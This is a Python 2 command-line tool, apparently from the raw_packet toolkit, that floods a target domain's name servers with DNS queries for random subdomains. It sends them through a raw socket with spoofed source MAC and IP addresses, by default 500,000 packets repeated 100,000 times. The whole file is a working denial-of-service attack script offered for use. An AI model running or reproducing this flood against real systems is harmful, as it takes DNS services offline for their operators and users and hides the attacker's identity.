from raw_packet.Utils.base import Base
from raw_packet.Utils.network import Ethernet_raw, DNS_raw
from argparse import ArgumentParser
from sys import exit, stdout
from ipaddress import ip_network, IPv4Interface
from socket import socket, AF_PACKET, SOCK_RAW, gethostbyname
from random import randint, choice
from datetime import datetime
from time import time


if __name__ == "__main__":

    Base.check_platform()
    Base.check_user()

    NAMES = []
    PACKETS = []

    parser = ArgumentParser(description='DNS Query sender')

    parser.add_argument('-i', '--interface', type=str, help='Set interface name for send DNS query packets')
    parser.add_argument('-M', '--notspoofmac', help='Don\'t spoof MAC address', action='store_true')
    parser.add_argument('-I', '--notspoofip', help='Don\'t spoof IP address', action='store_true')

    parser.add_argument('-p', '--packets', type=int,
                        help='Number of packets in one iteration (default: 500000)', default=500000)
    parser.add_argument('-k', '--iterations', type=int,
                        help='Number of iterations (default: 100000)', default=100000)

    parser.add_argument('-d', '--domain', type=str, required=True, help='Target domain name (example: test.com)')
    parser.add_argument('-s', '--nsservers', type=str, help='NS servers (example: "ns1.test.com,ns2.test.com")')
    parser.add_argument('-n', '--nsservers_ip', type=str, help='NS servers IP (example: "192.168.0.1,192.168.0.2")')

    parser.add_argument('-N', '--netspoofed', help='Network for IP spoofing (example: "192.168.0.0/24")', default=None)
    parser.add_argument('-P', '--dstport', type=int, help='Set destination port (default: 53)', default=53)
    parser.add_argument('-l', '--pathtodomainlist', type=str, help='Set path to file with domain list', default=None)

    args = parser.parse_args()

    eth = Ethernet_raw()
    dns = DNS_raw()

    if args.pathtodomainlist is not None:
        print "Create your DNS name list..."
        try:
            with open(args.pathtodomainlist, "r") as domain_list:
                for domain_name in domain_list:
                    NAMES.append(domain_name[:-1])
            print " List of domains len: " + str(len(NAMES))
            print " List of domains created: " + NAMES[0] + " ... " + NAMES[len(NAMES) - 1]

        except:
            print "File: " + args.pathtodomainlist + " not found!"
            exit(1)

    if args.interface is None:
        current_network_interface = Base.netiface_selection()
    else:
        current_network_interface = args.interface

    your_ip_address = Base.get_netiface_ip_address(current_network_interface)
    your_net_mask = Base.get_netiface_netmask(current_network_interface)
    your_interface = IPv4Interface(unicode(your_ip_address + "/" + your_net_mask))
    your_mac_address = Base.get_netiface_mac_address(current_network_interface)

    spoofed_hosts = None
    if not args.notspoofip:
        if args.netspoofed is None:
            current_network = ip_network(your_interface.network)
            spoofed_hosts = list(current_network.hosts())
            spoofed_hosts.pop(0)
            spoofed_hosts.pop(len(spoofed_hosts) - 1)
        else:
            if args.netspoofed[len(args.netspoofed)-2:] != "32":
                spoofed_network = ip_network(unicode(str(args.netspoofed)))
                spoofed_hosts = list(spoofed_network.hosts())
            else:
                spoofed_hosts = [str(args.netspoofed[:-3])]

        if len(spoofed_hosts) > 1:
            print "Spoofing IP: " + str(spoofed_hosts[0]) + " ... " + str(spoofed_hosts[len(spoofed_hosts) - 1])
        elif len(spoofed_hosts) == 1:
            print "Spoofing IP: " + str(spoofed_hosts[0])
        else:
            print "Can't make spoofed IP list!"
            exit(1)

    PORT = 0
    try:
        PORT = int(args.dstport)
    except:
        print "Bad dst port!"
        exit(1)

    if any([PORT < 1, PORT > 65535]):
        print "Dst port is not within range 1 - 65535"
        exit(1)

    NS_list = {}
    NAME_ns_list = []
    IP_ns_list = []

    if args.nsservers is None and args.nsservers_ip is None:
        print "Please set NS servers ip or domain names!"
        exit(1)
    else:

        if args.nsservers is not None:
            ns_servers_str = str(args.nsservers).replace(" ", "")
            NAME_ns_list = ns_servers_str.split(",")

        if args.nsservers_ip is not None:
            ns_servers_str = str(args.nsservers_ip).replace(" ", "")
            IP_ns_list = ns_servers_str.split(",")

    if len(NAME_ns_list) > 0:
        for NAME in NAME_ns_list:
            NS_list[NAME] = {}
            NS_list[NAME]["NAME"] = NAME
            NS_list[NAME]["PORT"] = PORT

            try:
                print "Resolving NS Server: " + NAME
                NS_list[NAME]["IP"] = str(gethostbyname(NAME))
                print NAME + ": " + NS_list[NAME]["IP"]
            except:
                print "Fail to resolving NS Server: " + NAME
                exit(1)

            try:
                print "Receiving mac address for NS Server: " + NS_list[NAME]["IP"]
                NS_list[NAME]["MAC"] = Base.get_mac(current_network_interface, NS_list[NAME]["IP"])
                print NS_list[NAME]["IP"] + ": " + NS_list[NAME]["MAC"]
            except:
                print "Fail to get MAC address for NS Server: " + NAME
                exit(1)

    if len(IP_ns_list) > 0:
        for IP in IP_ns_list:
            NS_list[IP] = {}
            NS_list[IP]["IP"] = IP
            NS_list[IP]["PORT"] = PORT

            try:
                print "Receiving mac address for NS Server: " + NS_list[IP]["IP"]
                NS_list[IP]["MAC"] = Base.get_mac(current_network_interface, NS_list[IP]["IP"])
                print NS_list[IP]["IP"] + ": " + NS_list[IP]["MAC"]
            except:
                print "Fail to get MAC address for NS Server: " + IP
                exit(1)



    DOMAIN = args.domain
    if not DOMAIN.startswith("."):
        DOMAIN = "." + DOMAIN

    count = 0
    count_max = int(args.packets)

    index_percent = 0
    count_percent = 0

    print "Creating packets..."

    if args.notspoofip:
        print " Your IP is not spoofed!"

    if args.notspoofmac:
        print " Your MAC address is not spoofed!"

    while count < count_max:

        for NS in NS_list.keys():

            DST_MAC = NS_list[NS]["MAC"]
            DST_IP = NS_list[NS]["IP"]
            DST_PORT = NS_list[NS]["PORT"]

            SRC_MAC = None
            SRC_IP = None
            SRC_PORT = randint(2049, 65535)

            if args.notspoofmac:
                SRC_MAC = your_mac_address
            else:
                SRC_MAC = eth.get_random_mac()

            if args.notspoofip:
                SRC_IP = your_ip_address
            else:
                if len(spoofed_hosts) > 1:
                    SRC_IP = str(choice(spoofed_hosts))
                elif len(spoofed_hosts) == 1:
                    SRC_IP = str(spoofed_hosts[0])
                else:
                    print "Bad spoofed network!"
                    exit(1)

            TID = randint(1, 65535)

            if args.pathtodomainlist is not None:
                NAME = choice(NAMES)
            else:
                NAME = Base.make_random_string(4) + "."
                NAME += Base.make_random_string(4)
                NAME += DOMAIN

            PACKET = dns.make_a_query(src_mac=SRC_MAC, dst_mac=DST_MAC,
                                      src_ip=SRC_IP, dst_ip=DST_IP,
                                      src_port=SRC_PORT, dst_port=DST_PORT,
                                      tid=TID, request_name=NAME)
            PACKETS.append(PACKET)

        count += 1

        if count > count_percent:
            stdout.flush()
            stdout.write(" Complete: " + str(index_percent + 1) + "%   \r")
            index_percent += 1
            count_percent = (count_max / 100) * index_percent

    NUMBER_OF_PACKETS = int(args.packets)
    NUMBER_OF_ITERATIONS = int(args.iterations)

    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    print "\r\nSending packets..."
    print "Number of packets:       " + str(args.packets)
    print "Start sending packets:   " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    start_time = time()

    for _ in range(NUMBER_OF_ITERATIONS):
        for index in range(NUMBER_OF_PACKETS):
            SOCK.send(PACKETS[index])

    stop_time = time()
    print "All packets sent:        " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))

    SOCK.close()
    delta_time = stop_time - start_time
    speed = (NUMBER_OF_PACKETS * NUMBER_OF_ITERATIONS) / delta_time
    print "Speed:                   " + str(int(speed)) + " pkt/sec\r\n"
